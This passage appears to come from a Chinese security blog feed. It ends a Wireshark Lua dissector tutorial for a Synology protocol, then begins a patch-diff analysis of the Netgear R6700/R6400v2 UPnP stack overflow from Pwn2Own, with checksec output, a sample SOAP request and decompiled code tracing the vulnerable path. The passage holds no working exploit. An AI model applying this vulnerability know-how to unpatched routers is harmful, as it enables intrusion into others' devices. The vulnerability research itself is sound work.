== <span class="number">4</span> <span class="keyword">then</span>     <span class="comment">-- common value field</span></span><br><span class="line">            <span class="keyword">return</span> value32</span><br><span class="line">        <span class="keyword">elseif</span> length == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> value16</span><br><span class="line">        <span class="keyword">elseif</span> length == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> value8</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatValue</span><span class="params">(type, value)</span></span></span><br><span class="line">    <span class="keyword">local</span> tmp_func = typeFormats[<span class="built_in">type</span>]</span><br><span class="line">    <span class="keyword">if</span>(tmp_func) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> tmp_func(value)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">synoFinderProtocol.dissector</span><span class="params">(buffer, pinfo, tree)</span></span></span><br><span class="line">    <span class="comment">-- (buffer: type Tvb, pinfo: type Pinfo, tree: type TreeItem)</span></span><br><span class="line">    <span class="keyword">local</span> buffer_length = buffer:<span class="built_in">len</span>()</span><br><span class="line">    <span class="keyword">if</span> buffer_length == <span class="number">0</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    pinfo.cols.protocol = synoFinderProtocol.name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> subtree = tree:add(synoFinderProtocol, buffer(), <span class="string">&quot;Synology Finder Protocol&quot;</span>)</span><br><span class="line">    subtree:add_le(magic, buffer(<span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> payloadStart = <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> payloadStart + offset &lt; buffer_length <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> tlvType = buffer(payloadStart + offset, <span class="number">1</span>):uint()</span><br><span class="line">        <span class="keyword">local</span> tlvLength = buffer(payloadStart + offset + <span class="number">1</span>, <span class="number">1</span>):uint()</span><br><span class="line">        <span class="keyword">local</span> valueContent = buffer(payloadStart + offset + <span class="number">2</span>, tlvLength)</span><br><span class="line">        <span class="keyword">local</span> tlvField = getFieldByType(tlvType, tlvLength)</span><br><span class="line">        <span class="keyword">local</span> fieldName = getFieldName(tlvField)</span><br><span class="line">        <span class="keyword">local</span> description</span><br><span class="line">        <span class="keyword">if</span> fieldName == <span class="string">&quot;Value&quot;</span> <span class="keyword">then</span></span><br><span class="line">            description = <span class="string">&quot;TLV (type&quot;</span> .. <span class="string">&quot;:&quot;</span> .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;0x%x&quot;</span>, tlvType) .. <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            description = fieldName .. <span class="string">&quot;: &quot;</span> .. <span class="built_in">tostring</span>(formatValue(tlvType, valueContent))</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">local</span> tlvSubtree = subtree:add(synoFinderProtocol, buffer(payloadStart+offset, tlvLength+<span class="number">2</span>), description)</span><br><span class="line">        tlvSubtree:add_le(<span class="built_in">type</span>, buffer(payloadStart + offset, <span class="number">1</span>))</span><br><span class="line">        tlvSubtree:add_le(length, buffer(payloadStart + offset + <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> tlvLength &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> fieldType = getFieldType(tlvField)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(fieldType, <span class="string">&quot;^IP&quot;</span>) == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">                <span class="comment">-- start with &quot;IP&quot;</span></span><br><span class="line">                tlvSubtree:add(tlvField, buffer(payloadStart + offset + <span class="number">2</span>, tlvLength))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                tlvSubtree:add_le(tlvField, buffer(payloadStart + offset + <span class="number">2</span>, tlvLength))</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        offset = offset + <span class="number">2</span> + tlvLength</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payloadStart + offset ~= buffer_length <span class="keyword">then</span></span><br><span class="line">        <span class="comment">-- fallback dissector that just shows the raw data</span></span><br><span class="line">        Dissector.get(<span class="string">&quot;data&quot;</span>):call(buffer(payloadStart+offset):tvb(), pinfo, tree)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> udp_port = DissectorTable.get(<span class="string">&quot;udp.port&quot;</span>)</span><br><span class="line">udp_port:add(<span class="number">9999</span>, synoFinderProtocol)</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文以群晖<code>NAS</code>设备中的某个私有协议为例，介绍了采用<code>Lua</code>脚本编写<code>Wireshark</code>协议解析插件的过程。该协议相对比较简单，但方法适用于其他协议。如果经常需要与某些私有协议打交道，在了解协议格式之后，可以尝试编写对应的协议解析插件，方便对协议进行理解与分析。</p><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="./syno_finder.zip">示例pcap文件及协议解析插件</a></p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9taWthLXMuZ2l0aHViLmlvL3dpcmVzaGFyay9sdWEvZGlzc2VjdG9yLzIwMTcvMTEvMDQvY3JlYXRpbmctYS13aXJlc2hhcmstZGlzc2VjdG9yLWluLWx1YS0xLmh0bWw=">Creating a Wireshark dissector in Lua 系列<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpcmVzaGFyay93aXJlc2hhcmsvYmxvYi9tYXN0ZXIvZXBhbi9kaXNzZWN0b3JzL3BhY2tldC1jZHAuYw==">Wireshark dissector packet-cdp<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cud2lyZXNoYXJrLm9yZy9kb2NzL3dzZGdfaHRtbF9jaHVua2VkL3dzbHVhX2Rpc3NlY3Rvcl9leGFtcGxlLmh0bWw=">Example: Dissector written in Lua<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cud2lyZXNoYXJrLm9yZy9kb2NzL3dzZGdfaHRtbF9jaHVua2VkL3dzbHVhcm1fbW9kdWxlcy5odG1s">Wireshark’s Lua API Reference Manual<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVGpGQ3lFQ29OQ1U3eUx0ajNfejE3UQ==">https://mp.weixin.qq.com/s/TjFCyECoNCU7yLtj3_z17Q<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn2Own Netgear R6700 UPnP漏洞分析</title>
      <link href="2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>6月15日，<code>ZDI</code>发布了有关<code>NETGEAR</code> <code>R6700</code>型号路由器的10个<code>0 day</code>的安全公告，其中有2个关于<code>UPnP</code>的漏洞：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwMy8=">认证绕过<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwNC8=">缓冲区溢出<i class="fa fa-external-link-alt"></i></span>。通过组合这2个漏洞，在<code>Pwn2Own Tokyo 2019</code>比赛中，来自<code>Team Flashback</code>的安全研究员<code>Pedro Ribeiro</code>和<code>Radek Domanski</code>成功在<code>R6700v3</code>设备上实现代码执行。</p><p>6月17日，<code>NETGEAR</code>官方发布了<span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">安全公告<i class="fa fa-external-link-alt"></i></span>，并针对<code>R6400v2</code>和<code>R6700v3</code>这2个型号的设备发布了补丁。由于此时还没有这2个漏洞的具体细节，于是打算通过补丁比对的方式对漏洞进行定位和分析。</p><a id="more"></a><h3 id="补丁比对"><a href="#补丁比对" class="headerlink" title="补丁比对"></a>补丁比对</h3><p>选取<code>R6400v2</code>型号作为目标设备，根据<code>NETGEAR</code>官方的安全公告，选取<code>R6400v2-V1.0.4.82</code>和<code>R6400v2-V1.0.4.92</code>两个版本进行比对分析。</p><blockquote><p>当时<code>R6400v2-V1.0.4.92</code>为最新的补丁版本，后来<code>NETGEAR</code>官方对安全公告进行了更新，目前最新的补丁版本为<code>R6400v2-V1.0.4.94</code>。</p></blockquote><p>由于漏洞与<code>UPnP</code>服务有关，于是对<code>upnpd</code>程序进行分析，<code>Bindiff</code>比对的结果如下。</p><img data-src="images/upnpd_bindiff.png"><p>由图可知，存在差异的重要函数共7个。逐个对函数进行比对和分析，最终定位到<code>sub_00024D80()</code>函数中(补丁版本)。</p><img data-src="images/vuln_func_control_flow.png"><p>可以看到，在<code>V1.0.4.92</code>补丁版本中，在调用<code>memcpy()</code>之前增加了一个长度校验，很有可能这里就是漏洞修复点。两个函数对应的伪代码如下，在补丁版本中，除了增加对<code>memcpy()</code>长度参数的校验外，<code>sscanf()</code>的格式化参数也发生了变化，可能在调用<code>sscanf()</code>时就会出现溢出。另外，结合该函数中的字符串<code>sa_setBlockName</code>，与<code>ZDI</code>漏洞公告中的描述相符，因此猜测这里就是栈溢出漏洞点。</p><blockquote><p>为了便于阅读，已对部分函数进行了重命名。</p></blockquote><img data-src="images/pseudocode_diff.png"><p>另外，通过补丁比对的方式，暂时未定位到认证绕过漏洞。</p><h3 id="漏洞利用限制"><a href="#漏洞利用限制" class="headerlink" title="漏洞利用限制"></a>漏洞利用限制</h3><p><code>upnpd</code>程序启用的缓解措施如下：仅启用了<code>NX</code>机制，同时程序的加载基址为<code>0x8000</code>。此外，设备上的<code>ALSR</code>等级为1，且<code>upnpd</code>程序崩溃后并不会重启。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file ./usr/sbin/upnpd</span> </span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>根据上述信息，在无信息泄露的前提下，要想利用漏洞实现任意代码执行，最大的难题是<code>NULL</code>字符截断的问题。由于<code>upnpd</code>程序中<code>.text</code>段地址的最高字节均为<code>&#39;\x00&#39;</code>，在覆盖返回地址后，后面的payload无法传入，因此只有一次覆盖返回地址的机会。想过尝试利用单次覆盖的机会泄露地址信息，但由于<code>upnpd</code>程序崩溃后不会重启，似乎也不可行。在尝试常规思路无果后，于是求助于<code>Pedro Ribeiro</code>，<code>Pedro Ribeiro</code>表示不便提前透露，但近期会公布漏洞细节。</p><blockquote><p>在其他设备中也遇到过<code>NULL</code>字符截断的问题，故对这个漏洞如何利用更感兴趣，暂时未对调用路径进行详细分析。</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>6月25日，<code>Pedro Ribeiro</code>在<code>GitHub</code>上公布了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlZHJpYi9Qb0MvYmxvYi9kYTMxN2JiYjIyYWJjMmM4OGM4ZmNhZDA2NjhjZGI5NGIyYmEwYTZmL2Fkdmlzb3JpZXMvUHduMk93bi9Ub2t5b18yMDE5L3Rva3lvX2RyaWZ0L3Rva3lvX2RyaWZ0Lm1k">漏洞细节<i class="fa fa-external-link-alt"></i></span>，并告知了我 ( 非常感谢:) )。结合<code>Pedro Ribeiro</code>的<code>write up</code>，加上有了可调试的真实设备，对这两个漏洞的细节有了更进一步的了解。</p><blockquote><p>感兴趣的可以去看一下<code>Pedro Ribeiro</code>的<code>write up</code>，很详细。</p></blockquote><h4 id="SOAP消息"><a href="#SOAP消息" class="headerlink" title="SOAP消息"></a><code>SOAP</code>消息</h4><p><code>upnpd</code>程序会监听<code>5000/tcp</code>端口，其主要通过<code>SOAP</code>协议来进行数据传输，这两个漏洞存在于对应的<code>POST</code>请求中。<code>SOAP</code>是一个基于<code>XML</code>的协议，一条<code>SOAP</code>消息就是一个普通的<code>XML</code>文档，其包含<code>Envelope</code>、<code>Header</code>(可选)、<code>Body</code>和<code>Fault</code>(可选)等元素。针对该设备，一个<code>POST</code>请求示例如下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 省略部分内容</span><br><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line"><span class="attribute">SetNetgearDeviceName</span></span><br><span class="line"><span class="attribute">&lt;NewBlockSiteName&gt;123456</span></span><br><span class="line"><span class="attribute">&lt;/NewBlockSiteName&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Envelope&gt;</span></span><br></pre></td></tr></table></figure><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><p>栈溢出漏洞存在于<code>sa_setBlockName()</code>函数内的<code>sscanf()</code>处，漏洞本身比较简单，但还需要对调用路径进行分析看如何触发。在<code>V1.0.4.82</code>版本中，函数<code>sa_setBlockName()</code>的调用路径如下。</p><img data-src="images/vuln_func_call_path.png" style="zoom:80%"><h5 id="sa-parseRcvCmd-函数"><a href="#sa-parseRcvCmd-函数" class="headerlink" title="sa_parseRcvCmd()函数"></a><code>sa_parseRcvCmd()</code>函数</h5><p>在函数<code>sa_parseRcvCmd()</code>内，需要使得<code>(3)</code>处的条件成立，即<code>v7=0xFF37</code>。<code>(2)</code>处循环及其后面的代码主要是查找标签并返回其索引(类型?)，同时解析标签中的内容，而在<code>(1)</code>处<code>v4</code>指向对应的标签名称表，其部分内容如下。因此，请求数据中需要包含<code>&lt;NewBlockSiteName&gt;</code>标签。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sa_parseRcvCmd</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = <span class="number">0</span>; haystack = a1; v76 = a2; v3 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;:Body&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v82, haystack, <span class="number">0x31</span>u);</span><br><span class="line">  v83 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">702</span>;</span><br><span class="line">  v4 = dword_7DA44;  <span class="comment">// (1) 指向标签名称及索引表</span></span><br><span class="line">  <span class="built_in">memset</span>(dword_D96CC, <span class="number">0</span>, <span class="number">0x5F0</span>u);</span><br><span class="line">  v5 = off_7DA48; v72 = dword_7DA4C;</span><br><span class="line">  <span class="keyword">if</span> ( off_7DA48 == <span class="string">&quot;END_OF_FILE&quot;</span> )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  v73 = v3 + <span class="number">6</span>; whence = <span class="number">0</span>; v6 = <span class="number">0</span>; v71 = <span class="number">0</span>; v75 = <span class="number">0</span>; buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )  <span class="comment">// (2) 查找标签,并获取其中的内容</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v7 = *v4;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;s, <span class="number">0x32</span>u, <span class="string">&quot;&lt;%s&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;v84, <span class="number">0x32</span>u, <span class="string">&quot;&lt;/%s&gt;&quot;</span>, v5);</span><br><span class="line">    v8 = <span class="built_in">strstr</span>(v73, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    v9 = <span class="built_in">strchr</span>(v8, <span class="string">&#x27;&gt;&#x27;</span>); v10 = v7 == <span class="number">0xFF3A</span> || v7 == <span class="number">0xFF13</span>;</span><br><span class="line">    src = v9 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = <span class="built_in">strstr</span>(src, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v84);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    wrap_vprintf(<span class="number">2</span>, <span class="string">&quot;%d, could not found %s\n&quot;</span>, <span class="number">0x4C6</span>, &amp;v84);</span><br><span class="line">LABEL_25:</span><br><span class="line">    <span class="keyword">if</span> ( v4 != &amp;dword_7E368 &amp;&amp; v71 &lt;= <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span> *)v4[<span class="number">4</span>]; v17 = v4[<span class="number">5</span>]; v4 += <span class="number">3</span>; v72 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&quot;END_OF_FILE&quot;</span> )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">0xFF13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">0xFF37</span> )  <span class="comment">// (3) 对应标签NewBlockSiteName</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_D96CC[<span class="number">19</span> * v71] = <span class="number">0xFF37</span>;</span><br><span class="line">        <span class="keyword">return</span> sa_setBlockName(src, (<span class="keyword">int</span>)buf);</span><br><span class="line">      <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; 标签名称和索引(类型?)表</span><br><span class="line">.data:0007DA44 dword_7DA44     DCD 0xFF00                                                 </span><br><span class="line">.data:0007DA48 off_7DA48       DCD aNewenable          ; &quot;NewEnable&quot;</span><br><span class="line">.data:0007DA4C dword_7DA4C     DCD 1                              </span><br><span class="line">; ...</span><br><span class="line">.data:0007DCE4                 DCD 0xFF37</span><br><span class="line">.data:0007DCE8                 DCD aNewblocksitena     ; &quot;NewBlockSiteName&quot;</span><br><span class="line">.data:0007DCEC                 DCD 0x3E8</span><br></pre></td></tr></table></figure><h5 id="sa-processResponse-函数"><a href="#sa-processResponse-函数" class="headerlink" title="sa_processResponse()函数"></a><code>sa_processResponse()</code>函数</h5><p>在<code>sa_processResponse()</code>函数内，在<code>(1)</code>处根据<code>soap_action</code>的类型进入不同的处理分支，在<code>case 0</code>中有多处(<code>SetDeviceNameIconByMAC</code>，<code>SetDeviceInfoByMAC</code>，<code>SetNetgearDeviceName</code>)会跳到分支<code>LABEL_184</code>，满足一定条件后在<code>(2)</code>处会调用<code>sa_parseRcvCmd()</code>，同样<code>case 1</code>中也有多处会跳到<code>LABEL_184</code>分支，之后会调用<code>sa_parseRcvCmd()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sa_processResponse</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4, <span class="keyword">char</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = (<span class="keyword">void</span> *)a1; v6 = a2;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 )  <span class="comment">// (1) soap action type</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:  <span class="comment">// 对应service：DeviceInfo</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0</span>) == <span class="number">1</span> ) <span class="comment">// GetInfo</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_241;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB1</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceNameIconByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">177</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB9</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceInfoByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">185</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xBA</span>) == <span class="number">1</span> ) <span class="comment">// SetNetgearDeviceName</span></span><br><span class="line">      &#123; v12 = <span class="number">186</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:  <span class="comment">// 对应service：DeviceConfig</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB8</span>) == <span class="number">1</span> ) <span class="comment">// SOAPLogin</span></span><br><span class="line">      &#123; v10 = <span class="number">184</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB6</span>) == <span class="number">1</span> ) <span class="comment">// RecoverAdminPassword</span></span><br><span class="line">      &#123; v12 = <span class="number">182</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:  <span class="comment">// 对应service：ParentalControl</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">71</span>) == <span class="number">1</span> ) <span class="comment">// GetAllMACAddresses</span></span><br><span class="line">      &#123; v10 = <span class="number">71</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">LABEL_184:</span><br><span class="line">      wrap_vprintf(<span class="number">3</span>, <span class="string">&quot;%s()\n&quot;</span>, <span class="string">&quot;sa_checkSessionID&quot;</span>);</span><br><span class="line">      v13 = <span class="built_in">strstr</span>(v6, <span class="string">&quot;SessionID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_759;</span><br><span class="line">      v14 = v13 + <span class="number">9</span>; v15 = <span class="built_in">strchr</span>(v13 + <span class="number">9</span>, <span class="number">62</span>); v16 = <span class="built_in">strstr</span>(v14, <span class="string">&quot;&lt;/&quot;</span>);</span><br><span class="line">      v17 = v15 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        v17 = v16 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v17</span><br><span class="line">        &amp;&amp; ((v18 = v15 + <span class="number">1</span>, v16 &gt;= v15 + <span class="number">1</span>) ? (v19 = v16 - (_BYTE *)v18) : (v19 = (_BYTE *)v18 - v16), v19 &lt;= <span class="number">0x27</span>) )</span><br><span class="line">      &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">      